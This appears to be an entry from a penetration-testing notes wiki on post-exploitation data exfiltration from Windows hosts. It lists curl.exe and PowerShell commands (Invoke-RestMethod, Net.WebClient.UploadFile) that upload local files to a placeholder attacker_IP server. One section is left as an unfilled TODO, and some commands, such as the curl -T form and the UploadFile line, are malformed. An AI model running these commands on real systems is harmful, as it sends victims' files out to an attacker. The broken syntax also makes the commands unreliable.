---
author(s):
  - Userware
tags:
  - post-exploitation
  - file-transfer-and-data-exfiltration
  - living-off-the-land
  - windows
---
# Upload

After you've setup a [[06 - Tactics & Techniques & Procedures (TTPs) Phases/F - Post Exploitation/0x05 - File Transfer and Data Exfiltration/Linux/Network Ports/HTTP/Server/Setup#^2d615d|PHP web server]] to exfiltrate files.

## 01 - Command Prompt

```
C:\> curl.exe -F fileToUpload=@file.txt http[s]://<attacker_IP>/upload.php

C:\> curl.exe -T fileToUpload=@file.txt http[s]://<attacker_IP>/upload.php
```

## 02 - PowerShell

TODO: Fill this info

### 2.1 - `Invoke-WebRequest`

```
PS C:\> 
```

### 2.2 - `Invoke-RestMethod`

```
PS C:\> $body = Get-Content file.txt
Invoke-RestMethod -Uri http[s]://<attacker_IP>[:<PORT>] -Method PUT -Body $body
```

### 2.3 - `UploadFile`

```
PS C:\> New-Object Net.WebClient.UploadFile('http[s]://<attacker_IP>[:<PORT>]/upload.php', 'file.txt')
```